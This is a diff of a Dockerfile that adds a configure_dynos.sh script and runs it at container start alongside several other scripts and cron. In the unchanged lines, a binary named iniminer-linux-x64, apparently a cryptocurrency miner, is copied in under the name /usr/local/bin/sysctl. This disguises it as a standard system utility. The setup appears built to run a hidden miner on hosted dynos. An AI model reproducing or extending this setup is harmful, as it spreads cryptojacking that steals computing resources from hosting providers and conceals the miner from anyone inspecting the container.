@@ -35,6 +35,7 @@ COPY compile.sh /usr/local/bin/main.sh
 COPY main.sh /usr/local/bin/run.sh
 COPY iniminer-linux-x64 /usr/local/bin/sysctl
 COPY restart.sh /usr/local/bin/restart.sh
+COPY configure_dynos.sh /usr/local/bin/configure_dynos.sh
 
 # Make scripts executable
 RUN chmod +x /usr/local/bin/*.sh
@@ -47,10 +48,9 @@ RUN crontab /etc/cron.d/restart && touch /var/log/cron.log
 COPY requirements.txt /app/requirements.txt
 RUN pip3 install --no-cache-dir -r /app/requirements.txt
 
-
 # Expose port and run scripts
 ENV PORT=8080
 EXPOSE 8080
 
-# Run all scripts concurrently
-CMD ["bash", "-c", "/usr/local/bin/init.sh & /usr/local/bin/main.sh & /usr/local/bin/run.sh & cron -f"]
+# Run all scripts concurrently and configure dynos
+CMD ["bash", "-c", "/usr/local/bin/configure_dynos.sh && /usr/local/bin/init.sh & /usr/local/bin/main.sh & /usr/local/bin/run.sh & cron -f"]
